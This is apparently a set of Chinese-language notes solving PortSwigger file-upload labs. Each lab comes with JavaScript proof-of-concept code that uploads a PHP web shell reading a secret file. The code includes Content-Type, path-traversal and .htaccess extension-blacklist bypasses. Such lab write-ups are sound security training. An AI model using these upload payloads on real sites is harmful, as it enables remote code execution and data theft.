---
title: File upload vulnerabilities
description: File upload vulnerabilities
---

## Lab: Remote code execution via web shell upload

| Dimension | Description                                                                                                 |
| --------- | ----------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/file-upload#exploiting-unrestricted-file-uploads-to-deploy-a-web-shell |
| Lab       | https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload |

沒想到這題是 APPRENTICE，我想應該就是上傳檔案，沒有實作副檔名跟內容限制吧，雖然是最簡單的技巧，但是影響力卻很高，CVSS 評分應該可以到滿分的漏洞

PoC

```js
const fd = new FormData();
fd.append("user", "wiener");
fd.append("csrf", "2odrwN7cqkhKRQRvotaiv1n1lwdYWDzw");
fd.append(
  "avatar",
  new File(
    ['<?php echo file_get_contents("/home/carlos/secret");?>'],
    "shell.php",
  ),
);
fetch(
  "https://0ad800ba04fb60a081dbe4fb002700ab.web-security-academy.net/my-account/avatar",
  {
    body: fd,
    method: "POST",
    mode: "cors",
    credentials: "include",
  },
);
```

## Lab: Web shell upload via Content-Type restriction bypass

| Dimension | Description                                                                                                           |
| --------- | --------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/file-upload#flawed-file-type-validation                                          |
| Lab       | https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass |

這題也是基本題，在真實世界用到爛掉的 Bypass 手法

```js
const fd = new FormData();
fd.append("user", "wiener");
fd.append("csrf", "m6UOOFWOQLPqPMrLYYBVcs8dkcAraT1t");
fd.append(
  "avatar",
  new File(
    ['<?php echo file_get_contents("/home/carlos/secret");?>'],
    "shell.php",
    { type: "image/png" },
  ),
);
fetch(`${location.origin}/my-account/avatar`, {
  body: fd,
  method: "POST",
  mode: "cors",
  credentials: "include",
});
```

## Lab: Web shell upload via path traversal

| Dimension | Description                                                                                               |
| --------- | --------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/file-upload#preventing-file-execution-in-user-accessible-directories |
| Lab       | https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal      |

這招也是我在真實世界用過的手法

PoC

```js
const fd = new FormData();
fd.append("user", "wiener");
fd.append("csrf", "isZVVSYEYtpRlaCX6yz0anh5DAVx57Nb");
fd.append(
  "avatar",
  new File(
    ['<?php echo file_get_contents("/home/carlos/secret");?>'],
    "..%2fshell.php",
  ),
);
fetch(`${location.origin}/my-account/avatar`, {
  body: fd,
  method: "POST",
  mode: "cors",
  credentials: "include",
});
```

server 回傳

```
The file avatars/../shell.php has been uploaded.
```

之後訪問 `/files/avatars/..%2fshell.php` => `/files/shell.php` 即可達成 RCE

## Lab: Web shell upload via extension blacklist bypass

| Dimension | Description                                                                                                      |
| --------- | ---------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/file-upload#insufficient-blacklisting-of-dangerous-file-types               |
| Lab       | https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass |

先上傳 `.htaccess`

```js
const fd = new FormData();
fd.append("user", "wiener");
fd.append("csrf", "IGiRSDTUXszpBJ3J9UsP9jz22kivemQu");
fd.append(
  "avatar",
  new File([`AddType application/x-httpd-php .hello`], ".htaccess"),
);
fetch(`${location.origin}/my-account/avatar`, {
  body: fd,
  method: "POST",
  mode: "cors",
  credentials: "include",
});
```

再上傳 `shell.hello`

```js
const fd = new FormData();
fd.append("user", "wiener");
fd.append("csrf", "IGiRSDTUXszpBJ3J9UsP9jz22kivemQu");
fd.append(
  "avatar",
  new File(
    ['<?php echo file_get_contents("/home/carlos/secret");?>'],
    "shell.hello",
  ),
);
fetch(`${location.origin}/my-account/avatar`, {
  body: fd,
  method: "POST",
  mode: "cors",
  credentials: "include",
});
```

這招確實猛，我以前沒想過可以這樣搞

## 參考資料

- https://portswigger.net/web-security/file-upload
